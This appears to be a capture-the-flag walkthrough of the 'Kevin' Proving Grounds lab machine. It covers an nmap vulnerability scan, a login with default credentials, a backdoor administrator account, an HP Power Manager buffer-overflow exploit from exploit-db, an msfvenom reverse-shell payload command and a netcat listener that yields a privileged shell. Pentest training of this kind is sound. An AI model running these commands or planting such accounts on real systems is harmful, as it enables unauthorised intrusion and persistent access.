---
title: Kevin Walkthrough - Proving Grounds
description: Walkthrough of the Kevin machine from Proving Grounds
author: Cyber Operator
date: 2024-07-25T16:55:50.565Z
tags:
  - Exploitable
---
# Kevin Walkthrough

This machine is classified as "Easy" under Proving Grounds.  It is a machine meant for practicing pentest in general or certification training, such as OSCP and others.

## 1. Nmap Scan:

We start with an Nmap version scan with the vuln script accross all ports

`nmap -sC -sV --script vuln -p- [target IP]`

![](/static/img/screenshot-2024-07-25-at-2.07.39 pm.png)

![](/static/img/screenshot-2024-07-25-at-2.08.47 pm.png)

Several things jump out, including a potential Remote Execution vulnerability.  Before going into that, let's recon the page at port 80 (GoAhead Webserver).  We start here, because it is literally an invitation to "Go Ahead":

We see a login for "HP Power Manager"

![](/static/img/screenshot-2024-07-25-at-1.05.04 pm.png)

As usual, we try to find default credentials:

![](/static/img/screenshot-2024-07-25-at-1.06.46 pm.png)

Let's try it out:

And using the admin:admin combination, we are logged in!

![](/static/img/screenshot-2024-07-25-at-1.08.05 pm.png)

While we are at it, let's create a new user in the app.  We'll make them an administrator.  This allows us to get back in the app if in the future an admin decides to actually change the default password.  We create user groot:iamgroot

![](/static/img/screenshot-2024-07-25-at-2.05.25 pm.png)



That gives us a surface to consider.  Before doing that, let's also zero in on the SMB vulnerability that we saw from the nmap scan:

![](/static/img/screenshot-2024-07-25-at-1.09.37 pm.png)

 

**NOTE: We are jumping around between potential vulnerabilities on purpose. I have not worked on this machine before and am writing the walkthrough real-time. I don't know which one of these vulnerabilities can be exploited or which one to work on first.  The thought process is what counts. In the real world (and in certification exams) there are vulnerabilities that are rabbit holes that sometimes hide the real gems.  The idea is to document everything you see as you work and see which vulnerability pays off faster/easier.  With that out of the way, let's continue!**

Let's look on searchsploit:

![](/static/img/screenshot-2024-07-25-at-1.18.34 pm.png)

Those are some exploits to consider.  To close the loop and for throroughness, let's check out more info on the  HP Power Manager.  We already discovered that it has default credentials and we also created our own user "groot".  There may be even more attack surfaces!

We do a simple Google search and find that there may be a buffer overflow vulnerability!

![](/static/img/screenshot-2024-07-25-at-2.25.48 pm.png)

And this is confirmed at exploit-db:

![](/static/img/screenshot-2024-07-25-at-2.28.06 pm.png)

Ok, that is enough exploring (at least for now).  Time to exploit!

## Exploitation:

We already saw the exploit that we found through a Google search.  Another way (without using a browser) is to use searchsploit again:

`searchsploit HP Power Manager`

![](/static/img/screenshot-2024-07-25-at-3.45.31 pm.png)

To download the exploit, we use

`searchsploit -m windows/remote/10099.py`

![](/static/img/screenshot-2024-07-25-at-3.49.23 pm.png)

Looking at the code for the exploit, we see that we need to use msvenom to generate shellcode (replace the default on the exploit file).

![](/static/img/screenshot-2024-07-25-at-3.52.28 pm.png)

Using msfvenom (and the bad string provided in the exploit code, we will use this command to generate our shellcode:

msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.49.60 LPORT=4444 -e x86/alpha_mixed -f c

This generates our shellcode

![](/static/img/screenshot-2024-07-25-at-5.44.18 pm.png)

Then, we paste our shellcode into the exploit file, replacing the previous version:

![](/static/img/screenshot-2024-07-25-at-5.45.47 pm.png)

Now we are ready, so we use a new terminal window to open a netcat listener with this command:

`nc -nlvp 4444`

On a separate window, we run the exploit file (I got errors using python3, so tried python2:

![](/static/img/screenshot-2024-07-25-at-5.50.39 pm.png)

We go to our netcat listener and we got a reverse shell! The shell is privileged so escalation is not required.

![](/static/img/screenshot-2024-07-25-at-5.53.00 pm.png)

Now we look for the flag.

![](/static/img/screenshot-2024-07-25-at-5.57.44 pm.png)

All done!
